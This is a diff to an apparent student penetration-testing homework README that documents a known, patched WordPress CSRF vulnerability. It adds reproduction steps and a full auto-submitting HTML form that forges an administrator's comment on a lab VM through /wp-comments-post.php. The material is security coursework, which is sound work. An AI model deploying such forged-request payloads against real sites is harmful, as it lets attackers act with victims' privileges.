@@ -15,8 +15,26 @@ Time spent: 17 hours spent in total
 - [ ] GIF Walkthrough: 
  ![Walkthrough exploit 1](https://github.com/sanjanabintaazad/codepath_homework/blob/wordpress_pen_testing/1st%20vulnerability.gif)
 - [ ] Steps to recreate: 
-  - hkkh
-  - sjs
+  - Log in as Administrator
+  - Post a comment to check it is taking the admin's comment
+  - Submit a malicious form that goes into /wp-comments-post.php hosted on github
+  
+      `<html>
+	      <head></head>
+	      <body>
+		      <form name="csrfForm" action="http://wpdistillery.vm/wp-comments-post.php" method="POST">
+			       <input type="hidden" name="comment" value="I made a comment">
+			       <input type="hidden" name="comment_post_ID" value="1">
+			       <input type="hidden" name="comment_parent" value="0">
+			       <input type="hidden" name="_wp_unfiltered_html_comment" value="2746298102">
+			       <input type="submit" value="Post+Comment">
+		
+		      </form> 
+		      <script> document.csrfForm.submit(); </script>
+	      </body>
+      </html>`
+
+  - The comment "I made a comment" will be posted after going to the github link which is submitting the form
 - [ ] Affected source code:
   - [Link 1](https://core.trac.wordpress.org/changeset/44842)
   - [Link 2](https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b)
